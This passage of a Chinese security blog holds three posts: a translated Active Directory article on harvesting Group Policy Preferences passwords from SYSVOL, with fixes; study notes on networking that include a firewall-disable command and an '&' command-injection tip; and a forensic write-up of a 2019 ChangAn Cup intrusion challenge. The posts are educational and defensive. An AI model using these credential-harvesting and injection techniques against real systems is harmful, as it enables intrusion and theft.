            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>2 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="翻译和复现Attack-Methods-for-Gaining-Domain-Admin-Rights-in-Active-Directory"><a href="#翻译和复现Attack-Methods-for-Gaining-Domain-Admin-Rights-in-Active-Directory" class="headerlink" title="翻译和复现Attack Methods for Gaining Domain Admin Rights in Active Directory"></a>翻译和复现Attack Methods for Gaining Domain Admin Rights in Active Directory</h1><p> 攻击者有很多方法可以获得活动目录中的域管理权限。本篇文章旨在介绍一些目前比较流行的方法。这里描述的 “assume breach”建立在攻击者已经在内部系统上有了立足点，并获得了域用户凭证（即后渗透阶段）。<br>不幸的是，对于大多数企业来说，攻击者从域用户到域管理员往往不需要很长时间。防御者心中的问题是 “这种情况是如何发生的？”。<br>攻击通常从向用户发送鱼叉式钓鱼电子邮件开始，使攻击者能够在目标网络内的计算机上运行代码。一旦攻击者让他们的代码在企业内部运行，第一步就是进行侦察，发现可用资源，从而提升权限，坚持下去，当然还有收集关键信息（通常是一个组织的 “皇冠上的珠宝”）。<br>While the overall process detail varies, the overall theme remains:<br>虽然流程细节各不相同，但总的主题仍然是：<br>恶意软件注入(鱼叉式钓鱼、web漏洞等)<br>内部侦察<br>窃取凭证<br>利用及提权<br>数据访问及过滤<br>后门维持<br>攻击者首先得在企业内部有一个立足点。此外，攻击者通常从攻击者的用户权限提升到本地管理员权限并不是很难。提权利用可以通过利用系统上未打补丁的权限升级漏洞来实现，更为常见的是在SYSVOL（如组策略首选项）中找到本地管理员密码。<br>在2015年举办的BSides, Shakacon, Black Hat, DEF CON, 和 DerbyCon这五个安全会议中，我谈到了本文中的大部分技术。<br>我也在 “The Most Common Active Directory Security Issues and What You Can Do to Fix Them “一文中介绍了其中的一些问题。</p>
<p>从域用户到域管理员的攻击技术：<br>1.SYSVOL和组策略首选项中的密码<br>这种方法是最简单的，不需要特殊的 “黑客 “工具。攻击者所要做的就是打开Windows资源管理器，搜索域SYSVOL DFS共享中的XML文件。大多数情况下，groups.xml、scheduletasks.xml、Services.xml等XML文件会包含凭证。</p>
<p>SYSVOL是Active Directory中的域范围共享，AD中所有经过认证的用户都可以读取访问。SYSVOL包含登录脚本、组策略数据和其他需要在有域控制器的任何地方提供的域范围内的数据（因为SYSVOL在所有域控制器之间自动同步和共享）。所有域组策略都存储在这里/DOMAIN&gt; /SYSVOL/<br><DOMAIN>/Policies/</DOMAIN></p>
<p>当创建一个新的GPP时，会在SYSVOL中创建一个相关的XML文件，里面有相关的配置数据，如果有提供密码，则是AES-256加密、。</p>
<p>除了在2012年之前，微软在MSDN上公布了AES加密密钥（共享秘密），可以用来解密密码。由于经过认证的用户（任何域用户或受信任域中的用户）都有对SYSVOL的读取权限，因此域中的任何人都可以在SYSVOL共享中搜索包含 “cpassword “的XML文件，该文件是包含AES加密密码的值。<br><img src="/2021/03/28/domain/1.png"><br>通过访问这个XML文件，攻击者可以使用AES私钥来解密GPP密码。PowerSploit函数Get-GPPPassword对于组策略优先级的利用最为有用。以上截图显示了一个类似的PowerShell函数，从SYSVOL中找到的XML文件中加密GPP密码。<br><img src="/2021/03/28/domain/2.png"><br>其他文件类型也可能有内嵌的密码（通常是明文的），如vbs和bat。<br><img src="/2021/03/28/domain/3.jpeg"><br>我们会认为，随着补丁的发布，管理员应该不会再在组策略首选项中放置凭证，但是我在评估客户安全时，仍然会在SYSVOL中发现凭证。</p>
<p>解决方法：</p>
<ul>
<li>在每台用于管理GPO的计算机上安装KB2962486，它可以防止新的凭证被放在组策略首选项中。</li>
<li>删除SYSVOL中包含密码的现有GPP xml文件。</li>
<li>不要把密码放在所有经过认证的用户都能访问的文件中。<br>关于这种攻击方法的更多信息在帖子中介绍。Finding Passwords in SYSVOL &amp; Exploiting Group Policy Preferences.</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/03/28/sparrow/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="让自己去触碰安全的blue sky">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/28/sparrow/" class="post-title-link" itemprop="url">小知识思考</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-03-28 15:26:51" itemprop="dateCreated datePublished" datetime="2021-03-28T15:26:51+08:00">2021-03-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-05-06 19:07:11" itemprop="dateModified" datetime="2021-05-06T19:07:11+08:00">2021-05-06</time>
              </span>

          
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>2.3k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>2 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>鉴于经常会有奇怪的思想，故而为自己专门书写这么一篇文章，想到什么记什么。</p>
<p>包含<strong>任务、所好奇之事</strong>等</p>
<h2 id="0x02-具现"><a href="#0x02-具现" class="headerlink" title="0x02 具现"></a>0x02 具现</h2><h3 id="1-一次百度涉及-从浏览器输入URL到浏览器显示页面发生了什么？"><a href="#1-一次百度涉及-从浏览器输入URL到浏览器显示页面发生了什么？" class="headerlink" title="1. 一次百度涉及?从浏览器输入URL到浏览器显示页面发生了什么？"></a>1. 一次百度涉及?从浏览器输入URL到浏览器显示页面发生了什么？</h3><ol>
<li><p><strong>输入地址</strong><br>输入地址时，浏览器其实已经开始只能匹配URL，用于补全。当然如果有缓存，直接从缓存中展示网页。</p>
</li>
<li><p><strong>浏览器查找域名IP</strong><br>查看本地hosts文件，查看其中是否有与此域名对应的规则，如果有，则直接用此IP；<br>若无，向本地DNS服务器(自己网络接入服务器商所提供)发出请求，服务器会查询其缓存记录；<br>若无，本地服务器向DNS根服务器查询；<br>若无，根据跟服务器给出的域服务器地址，让本地DNS服务器去找域服务器；<br>.com域服务器返回本地服务器的域名解析服务器的地址；<br>本地服务器向域名解析服务器发出请求，收到域名与IP地址的对应关系。并保存于缓存中用于下次快速访问。</p>
</li>
<li><p><strong>浏览器向web服务器发送HTTP请求</strong><br>浏览器以随机端口[1024-65535]向服务器的web服务(nginx、httpd)80端口发起TCP连接请求。通过多种路由设备，进入网卡，然后进入到内核的TCP/IP协议栈对该包进行解封。可能还要经过Netfilter防火墙(内核模块的过滤)<br>，最终到达web程序，建立TCP连接。常称TCP三次握手。<br>建立TCP连接后，发起HTTP请求。GET、POST、PUT 和 DELETE 、HEAD、OPTION以及 TRACE。<br>http请求一般包含三部分：请求方法URL协议/版本(第一行)、请求头(Request Header)、请求正文。<br>请求头和请求正文之前存在一个空行，表示请求头已经结束，接下来的是请求正文</p>
</li>
<li><p><strong>服务器的永久重定向响应</strong><br>server给浏览器响应一个301永久重定向响应，301永久重定向：把带www的和不带www的访问地址归到同一个网站排名下</p>
</li>
<li><p><strong>浏览器跟踪重定向地址</strong><br>浏览器知道<a target="_blank" rel="noopener" href="http://www.google.com/">http://www.google.com/</a> 是访问的正确地址，所以发送另一个http请求。</p>
</li>
<li><p><strong>服务器处理请求</strong><br>后端从固定端口接收TCP报文，处理TCP连接，解析HTTP协议，按照报文格式封装成供上层使用的HTTP Request对象；<br>大网站使用反向代理服务器时，客户端先请求到nginx，nginx再请求应用服务器，最后将结果返回给客户端，Nginx是反向代理服务器。以免某台服务器down了，影响用户使用。<br><img src="/2021/03/28/sparrow/3.jpg"></p>
</li>
<li><p><strong>服务器返回一个HTTP响应</strong><br>HTTP响应与HTTP请求相似，由3个部分构成:状态行、响应头(Response Header)、响应正文</p>
</li>
</ol>
<ol start="8">
<li><strong>浏览器显示 HTML</strong><br>WebKit引擎渲染的过程：<br>解析html以构建dom树 -&gt; 构建render树 -&gt; 布局render树 -&gt; 绘制render树</li>
<li><strong>浏览器发送请求获取嵌入在 HTML 中的资源（如图片、音频、视频、CSS、JS等等）</strong></li>
</ol>
<ul>
<li><p>DNS负载均衡<br>针对请求资源膨胀的情况，为了防止机子down掉。<br>原理：在DNS服务器中为同一个主机名配置多个IP地址，在应答DNS查询时，将DNS文件中主机记录的IP地址按顺序访问返回不同的解析结果。使得不同客户端访问不同服务器，从而能达到负载均衡的目的。</p>
</li>
<li><p>为什么需要三次握手？</p>
</li>
</ul>
<p><strong>第一次握手：</strong>client将标志位SYN置为1,随机产生一个值为seq=J（J的取值范围为=1234567）的数据包到服务器，client进入SYN_SENT状态，等待server确认；</p>
<p><strong>第二次握手：</strong>server收到数据包后由标志位SYN=1知道client请求建立连接，server将标志位SYN和ACK都置为1，ack=J+1，随机产生一个值seq=K，并将该数据包发送给client以确认连接请求，server进入SYN_RCVD状态。</p>
<p><strong>第三次握手：</strong>client收到确认后，检查ack是否为J+1，ACK是否为1，如果正确则将标志位ACK置为1，ack=K+1，并将该数据包发送给server，server检查ack是否为K+1，ACK是否为1，如果正确则连接建立成功，client和server进入ESTABLISHED状态，完成三次握手，随后client与server之间可以开始传输数据了。</p>
<p>三次握手”的目的是为了<strong>防止已失效的连接请求报文段突然又传送到了服务端，产生错误。</strong><br>某滞留请求延迟发给服务端，服务器返回确认报文，若是client一直不确认，server会一直等待，造成资源浪费。<br><img src="/2021/03/28/sparrow/1.jpg"></p>
<ul>
<li>为什么需要四次挥手？</li>
<li><em>第一次挥手：</em>* Client发送一个FIN，用来关闭Client到Server的数据传送，Client进入FIN_WAIT_1状态。</li>
</ul>
<p><strong>第二次挥手：</strong> Server收到FIN后，发送一个ACK给Client，确认序号为收到序号+1（与- SYN相同，一个FIN占用一个序号），Server进入CLOSE_WAIT状态。</p>
<p><strong>第三次挥手：</strong> Server发送一个FIN，用来关闭Server到Client的数据传送，Server进入LAST_ACK状态。</p>
<p><strong>第四次挥手：</strong> Client收到FIN后，Client进入TIME_WAIT状态，接着发送一个ACK给Server，确认序号为收到序号+1，Server进入CLOSED状态，完成四次挥手。<br>四次挥手，在server收到对方的FIN时，表示client不再发送数据，但是还可以接收server的数据。所以将ACK和FIN分开发送。<br><img src="/2021/03/28/sparrow/2.jpg"></p>
<h3 id="3-命令"><a href="#3-命令" class="headerlink" title="3.命令"></a>3.命令</h3><p>tar xzvf<br>sudo ufw disable</p>
<p>mv用来改名哦.cp更靠谱一点</p>
<h3 id="4-tips"><a href="#4-tips" class="headerlink" title="4. tips"></a>4. tips</h3><p>对于命令注入不过滤参数的：&amp;</p>
<p><img src="/2021/03/28/sparrow/4.jpg"></p>
<h3 id="5-nmap"><a href="#5-nmap" class="headerlink" title="5.nmap"></a>5.nmap</h3><p><strong>nmap -sn</strong>  ping scan, - disable port scan</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/03/24/changAnCup/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="让自己去触碰安全的blue sky">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/24/changAnCup/" class="post-title-link" itemprop="url">2019 ChangAn Cup复盘</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-03-24 19:57:41" itemprop="dateCreated datePublished" datetime="2021-03-24T19:57:41+08:00">2021-03-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-07-14 10:46:08" itemprop="dateModified" datetime="2021-07-14T10:46:08+08:00">2021-07-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/" itemprop="url" rel="index"><span itemprop="name">电子数据取证</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%8F%96%E8%AF%81/" itemprop="url" rel="index"><span itemprop="name">计算机取证</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>4.9k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>4 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>话不多说 直接复盘 查漏补缺</p>
<h2 id="0x02-分析思路"><a href="#0x02-分析思路" class="headerlink" title="0x02 分析思路"></a>0x02 分析思路</h2><h3 id="检材1："><a href="#检材1：" class="headerlink" title="检材1："></a>检材1：</h3><p>使用仿真对检材1进行分析，开机后发现该Linux无法使用密码远程连接，修改配置文件/etc/ssh/sshd_config文件进行配置：<br>把PasswordAuthentication后的参数改为yes，重启ssh服务（systemctl restart sshd）即可使用远程工具连接；<br><img src="/2021/03/24/changAnCup/clipboard.png"></p>
<p>查看历史执行命令history，可看到少数命令，怀疑本地的历史命令被加密，/var/log日志目录被删除：<br><img src="/2021/03/24/changAnCup/1.png"><br>netstat -anptl查看服务器开启的端口发现8091和39999上有docker-proxy<br><img src="/2021/03/24/changAnCup/2.png"><br>使用docker ps命令查看docker容器情况，发现docker运行了3个容器，其中验证了第二个ssh的容器属于干扰项，没有作用；<br><img src="/2021/03/24/changAnCup/3.png"><br><img src="/2021/03/24/changAnCup/4.png"></p>
<p>id为16fc..的容器将自身80端口映射到了本机8091端口上，主要运行的命令为nginx；<br>id为53766的容器开启了8012端口，主要运行命令docker-entrypoint.sh；<br>使用docker inspect 命令可以查看到容器详细信息，如下：<br><img src="/2021/03/24/changAnCup/5.png"><br><img src="/2021/03/24/changAnCup/6.png"><br><img src="/2021/03/24/changAnCup/7.png"><br><img src="/2021/03/24/changAnCup/8.png"><br><img src="/2021/03/24/changAnCup/9.png"><br><img src="/2021/03/24/changAnCup/10.png"><br><img src="/2021/03/24/changAnCup/11.png"><br><img src="/2021/03/24/changAnCup/12.png"><br>使用命令 docker exec -it id号 /bin/bash可以进入到容器内部，16fc160060c1容器内主要运行nginx服务，因此查看nginx配置文件：<br><img src="/2021/03/24/changAnCup/13.png"><br><img src="/2021/03/24/changAnCup/14.png"><br>通过查看nginx配置文件可以知道，nginx访问日志放在相对路径logs下的jrweb.log中，nginx将所有来自自身80端口的请求转发到IP为172.17.0.3的8012端口上，由ID为53766d68636f的容器开启的8012端口可知，应该是转发到该容器，该容器（53766d68636f）在案件中的ip应为172.172.0.3（由于出题时候未设固定ip因此每个人仿真起来之后ip可能会发生变化，前面查看docker inspect时候可看到该容器ip变化为172.17.0.2）；<br><img src="/2021/03/24/changAnCup/15.png"><br>通过查看访问网站的访问日志jrweb.log可知，该网站案发当时的IP地址为192.168.184.128，使用端口8091，分别有ip192.168.184.1和192.168.184.133对该网站进行过访问，133的ip可以看到有尝试登陆的请求；<br><img src="/2021/03/24/changAnCup/16.png"><br>查看Id为53766d68636f的容器，查看history命令可知网站路径为/home/vue2-element-touzi-admin（物理机路径可以查看前面docker inspect），<br><img src="/2021/03/24/changAnCup/17.png"><br><img src="/2021/03/24/changAnCup/18.png"><br>网站根目录下有README.md文件，通过查看可了解网站大致的配置情况，查看server目录下的index.js可知网站的主要配置情况<br><img src="/2021/03/24/changAnCup/19.png"><br>查看server目录下的api.js文件课知，该文件引用了当前目录下的db文件<br><img src="/2021/03/24/changAnCup/20.png"><br>查看网站/server目录下的db.js文件可知，该网站使用mongo的数据库，数据库用户名和密码为root、root，网站使用站库分离结构，数据地址位于192.168.184.129（该ip为检材2的解压密码），使用端口27017，使用的databases为tougu；<br><img src="/2021/03/24/changAnCup/21.png"></p>
<h3 id="检材2："><a href="#检材2：" class="headerlink" title="检材2："></a>检材2：</h3><p>使用192.168.184.129对检材2进行解压，对检材计算哈希并及进行静态分析和仿真：<br>使用history命令发现如下信息：下载过某程序、执行了encrypt（5）程序，删掉了之前的bash历史记录：<br><img src="/2021/03/24/changAnCup/22.png"><br>前面分析已知该服务器为mongodb服务器，通过端口确认mongo监听在27017端口<br><img src="/2021/03/24/changAnCup/23.png"><br>通过/root/.dbshell发现数据库操作的shell记录，里面发现几条重要信息（由于shell没有时间戳，只能用来推测不能单过证据）<br><img src="/2021/03/24/changAnCup/24.png"><br>通过查看mongo进程信息发现mongo的配置信息，查看mongod.conf文件发现mongod的日志配置情况和安装物理路径。<br><img src="/2021/03/24/changAnCup/25.png"><br><img src="/2021/03/24/changAnCup/26.png"><br>结合系统登陆日志和mongo的日志查看，发现在时间7-11 18：05至18：32分中间，133IP一直在登录状态，同时间没有其他用户登陆，日志中，同时间端发现大量的操作日志，drop为删除数据库指令<br><img src="/2021/03/24/changAnCup/27.png"><br><img src="/2021/03/24/changAnCup/28.png"><br><img src="/2021/03/24/changAnCup/29.png"><br><img src="/2021/03/24/changAnCup/30.png"></p>
<h3 id="检材3"><a href="#检材3" class="headerlink" title="检材3"></a>检材3</h3><p>使用192.168.184.133对检材3进行解压，对检材计算哈希并及进行静态分析和仿真：<br>通过history命令查看历史命令记录，可以看到大量安装配置pptpd（pptpd是指运行在服务器上提供pptp协议服务的软件）的命令：<br><img src="/2021/03/24/changAnCup/31.png"><br>其中还有大量修改时区信息的命令<br><img src="/2021/03/24/changAnCup/32.png"><br>数据包抓取的命令：<br><img src="/2021/03/24/changAnCup/33.png"><br>通过查看pptpd的配置文件可知如下信息：配置了options.pptpd、开启写入wtmp、定义了本地远程IP地址（可以参看教程<a target="_blank" rel="noopener" href="https://blog.csdn.net/ljm_503909378/article/details/41478121%EF%BC%89%EF%BC%9A">https://blog.csdn.net/ljm_503909378/article/details/41478121）：</a><br><img src="/2021/03/24/changAnCup/34.png"><br><img src="/2021/03/24/changAnCup/35.png"><br><img src="/2021/03/24/changAnCup/36.png"><br>查看/etc/ppp/options.pptp文件可以知道，pptpd开启了日志信息，记录在/var/log/pptpd.log中（当然在历史命令中也可以得知该日志）：<br><img src="/2021/03/24/changAnCup/37.png"><br>继续查看该目录下的chap-secrets文件，该文件为用户验证文件，记录了客户端的使用名称和密码：<br><img src="/2021/03/24/changAnCup/38.png"><br>查看pptpd的日志进行分析，发现IP为172.16.80.188通过账号VPN1成功登陆VPN服务器，时间为2019-07-13 14：15：37 UTC+6(注意！该服务器时区为UTC+6,与北京时间相差2小时)，这段时间内还有多个IP通过VPN2\3\4等账号连结果vpn服务器（干扰项），结合下面的PCAP文件可以进行排查筛选：<br><img src="/2021/03/24/changAnCup/39.png"><br><img src="/2021/03/24/changAnCup/40.png"><br><img src="/2021/03/24/changAnCup/41.png"><br>查看last登陆成功日志可以对应上时间：<br><img src="/2021/03/24/changAnCup/42.png"><br>已知该服务器中存在着数据包文件，将两个文件导出并进行分析，查看到两个文件的内容，该vpn服务器为双网卡，对内IP为192.168.184.133，具备对检材1（192.168.184.128）和检材2（192.168.184.129）访问权限，出口/服务端IP为172.16.80.92，通过分析可发现IP172.16.80.188在北京时间16：15-17：58之前进行了大量的操作，以192.168.184.133的身份对目标网站进行了连接和访问：<br><img src="/2021/03/24/changAnCup/43.png"><br><img src="/2021/03/24/changAnCup/44.png"></p>
<h3 id="检材4"><a href="#检材4" class="headerlink" title="检材4"></a>检材4</h3><p>使用密码172.16.80.188对检材4进行解压，并使用火眼介质分析和火眼仿真对该介质进行动态和静态分析：</p>
<h4 id="1-github访问"><a href="#1-github访问" class="headerlink" title="1.github访问"></a>1.github访问</h4><p>使用火眼介质分析分析上网记录发现目标服务器（192.168.184.128）的访问记录：<br>16:17分找到权限并尝试登陆页面<br><img src="/2021/03/24/changAnCup/45.png"><br>结合前面服务器的登陆日志、网站访问日志、抓包文件等分析结果确认最早入侵时间为北京时间2019-07-13 16：17：35（注意！目标服务器的时区为0时区，与北京时间相差8小时）<br><img src="/2021/03/24/changAnCup/46.png"><br><img src="/2021/03/24/changAnCup/47.png"></p>
<p>在入侵开始时，嫌疑人除访问目标服务器外，还访问了github，根据上网记录登陆github网址查看，搜索用户PackerLin，查看该用户页面，发现其上传过test2的文件，下载后发现为密钥文件，使用该文件尝试连接目标服务器，可以成功登陆，结合检材1默认设置为密钥登陆（禁用密码登陆），可以确认嫌疑人是从git上发现了服务器的连接密钥，从而对服务器实施的入侵。<br><img src="/2021/03/24/changAnCup/48.png"></p>
<h4 id="2-手机备份分析"><a href="#2-手机备份分析" class="headerlink" title="2.手机备份分析"></a>2.手机备份分析</h4><p>使用火眼介质分析发现内容如下:<br>IOS备份，虚拟机记录Ubuntu，Xshell连接密钥<br> <img src="/2021/03/24/changAnCup/49.png"><br>通过仿真启动检材4镜像，在桌面看到如下内容：<br>Xshell直接运行起来发现其中有两个连接记录，通过密钥的方式进行的连接，密钥文件为packerlin’s test（Xshell的缓存）<br><img src="/2021/03/24/changAnCup/50.png"><br>同时桌面还有一个便签内容为‘niuroumian6’，一个新建文本文档，打开之后看起来像一个密码字典，<br><img src="/2021/03/24/changAnCup/51.png"><br>使用火眼添加手机备份文件为证据直接进行分析，发现该手机备份为加密备份，尝试发现的各种密码，‘niuroumian6’成功解开备份，可以直接对手机备份进行分析，手机内的短信、微信、qq中均发现案件相关聊天记录，通过聊天记录基本可以梳理出来整个案发的流程，同时通过短信了解到该嫌疑人还使用钓鱼网站对一名受害者进行诈骗：<br><img src="/2021/03/24/changAnCup/52.png"><br>通过对检材4分析，发现前面的虚拟机有嫌疑，因此导出虚拟机查看<br> <img src="/2021/03/24/changAnCup/53.png"></p>
<h4 id="3-网站重构"><a href="#3-网站重构" class="headerlink" title="3.网站重构"></a>3.网站重构</h4><p>在前面检材分析过程中，发现mongo服务器的数据库被drop掉，数据库中无内容，结合后面聊天记录了解到，在检材2的root目录下存在一个被加密的db，应该是嫌疑人要对目标进行勒索，因此下载了加密软件进行了加密<br><img src="/2021/03/24/changAnCup/60.png"><br>方法1：可以尝试使用逆向工程的方法对encrypt（5）文件进行分析，查看大致的加密方式，从而尝试破解或者解密。使用IDA对ELF文件进行逆向分析，可以通过代码或者流图大致看出该加密方式为逐字节+66（10进制），然后和AA进行异或，由于加密方式很简单可以通过WINHEX或者编写简单脚本即可实现解密。<br><img src="/2021/03/24/changAnCup/61.png"><br><img src="/2021/03/24/changAnCup/62.png"><br>方法2：<br>在windows检材中，C盘根目录发现了一个VHD的文件，<br><img src="/2021/03/24/changAnCup/63.png"><br> 双击直接运行，win10系统会自动挂载，发现该分区为bitloker加密分区，通过时间线分析（详见下文），发现该检材又发出过邮件，但是本机未分析出来，通过前面的流量包考虑到，该设备的流程应该都被检材3监听下来，因此尝试对数据包进行分析，发现了一份邮件发出的数据包，追踪TCP流将邮件提取出，发现了备份的bitlocker密钥，但是压缩包加过密码，因此需要尝试破解，联想到之前发现的密码线索桌面字典和便签，尝试对该压缩包进行字典破解，成功破解出密码  !VCHWEDfdfd2IOA564356:”:”  ，<br><img src="/2021/03/24/changAnCup/64.png"><br><img src="/2021/03/24/changAnCup/65.png"><br><img src="/2021/03/24/changAnCup/66.png"><br>成功解压后，可以对加密分区进行解密，该分区内发现了3个与案件相关的重要文件，结合时间线，db文件为嫌疑人拖库的mongo数据，decrypt为解密程序，we.tar.gz为嫌疑人下载的网站代码，因此直接使用db，或者上传decrypt（解压密码为便签内容）到检材1、2，对其中加密的文件进行解密<br> <img src="/2021/03/24/changAnCup/67.png"></p>
<p>通过上述两种方法，我们可以找到正常的数据库备份文件db，因此导回检材2的mongo数据库中，可以尝试重启网站：<br><img src="/2021/03/24/changAnCup/68.png"><br>由于检材在本地仿真的时候IP发生了变化，因此要调整配置文件的内容，对检材1中的nginx配置文件和数据库配置文件进行修改，此处修改要根据自己虚拟机网络配置的情况进行修改，修改好配置之后，将docker中的run.sh脚本复制到网站目录执行后可以启动网站。<br><img src="/2021/03/24/changAnCup/69.png"><br><img src="/2021/03/24/changAnCup/70.png"><br><img src="/2021/03/24/changAnCup/71.png"><br>查看检材1中网站配置文件/server/index.js，发现该文件引用了api.js，查看该文件发现其中关键的验证登录的字段，直接使用数据库种明文密码登陆，因此登陆数据库查看user表，使用表中用户登陆网站，成功登陆进去<br><img src="/2021/03/24/changAnCup/72.png"><br><img src="/2021/03/24/changAnCup/73.png"><br><img src="/2021/03/24/changAnCup/74.png"></p>
<h3 id="案情时间线梳理"><a href="#案情时间线梳理" class="headerlink" title="案情时间线梳理"></a>案情时间线梳理</h3><p>16:17分找到权限并尝试登陆页面<br><img src="/2021/03/24/changAnCup/80.png"><br>16:19:54下载密钥文件<br><img src="/2021/03/24/changAnCup/81.png"><br>16:20:42 运行xshell<br><img src="/2021/03/24/changAnCup/82.png"><br>16:21:18 设置用户密钥<br><img src="/2021/03/24/changAnCup/83.png"><br>16:21:28 成功连接128服务器<br><img src="/2021/03/24/changAnCup/84.png"><br>16:31:06 初次启动xftp，创建文件夹及文件<br><img src="/2021/03/24/changAnCup/85.png"><br>16;33:00传输web文件，16:33:15传输完成<br><img src="/2021/03/24/changAnCup/86.png"><br><img src="/2021/03/24/changAnCup/87.png"></p>
<p>16:34:55 登陆网页微信<br><img src="/2021/03/24/changAnCup/88.png"><br>16:40:13 打开rar，解压web文件<br><img src="/2021/03/24/changAnCup/89.png"><br>16:44:03查看关键数据库链接文件<br><img src="/2021/03/24/changAnCup/90.png"><br>16:45:45——数据库连接<br><img src="/2021/03/24/changAnCup/91.png"><br>16:53:45——17:12:30 手机QQ/微信购买ddos<br><img src="/2021/03/24/changAnCup/92.png"><br>17:15:33 下载runit（DDOS）<br><img src="/2021/03/24/changAnCup/93.png"><br>17:18:20新建xshell连接，17:18:55连接成功<br><img src="/2021/03/24/changAnCup/94.png"><br>17:22:23 下载db<br><img src="/2021/03/24/changAnCup/95.png"><br><img src="/2021/03/24/changAnCup/96.png"><br>17:27:53——17:37:56 手机QQ/微信购买加密解密<br><img src="/2021/03/24/changAnCup/97.png"><br>17:39:32 下载解密程序<br><img src="/2021/03/24/changAnCup/98.png"><br>17:42:20 再次访问129服务器<br><img src="/2021/03/24/changAnCup/99.png"><br>17:44:35 再次连接128服务器<br><img src="/2021/03/24/changAnCup/100.png"><br>17:45:16 XFTP连接128服务器<br><img src="/2021/03/24/changAnCup/101.png"><br><img src="/2021/03/24/changAnCup/102.png"><br>17:49:01 bitlocker加密<br><img src="/2021/03/24/changAnCup/103.png"><br>17:49:45 密钥生成于C:\users<br><img src="/2021/03/24/changAnCup/104.png"><br>17:51:47 桌面出现txt<br><img src="/2021/03/24/changAnCup/105.png"><br>17:52:19 目录下出现BitLocker.rar<br><img src="/2021/03/24/changAnCup/106.png"><br>17:53:24 运行foxmail<br><img src="/2021/03/24/changAnCup/107.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考:"></a>参考:</h2><p>1.<a target="_blank" rel="noopener" href="https://xdforensics-wiki.github.io/XDforensics-wiki/linux2/#docker">https://xdforensics-wiki.github.io/XDforensics-wiki/linux2/#docker</a><br>1、<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/806485990aea">https://www.jianshu.com/p/806485990aea</a> Docker文件目录 - 简书<br>2、<a target="_blank" rel="noopener" href="https://hub.docker.com/_/mysql">https://hub.docker.com/_/mysql</a> mysql - Docker Hub<br>3、李鹏超, 周凯. 基于Docker容器的电子数据取证方法[J]. 吉林大学学报(理学版), 2019, 57(06): 1485-1490.</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/03/24/php-unserialize/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="让自己去触碰安全的blue sky">
    </span>

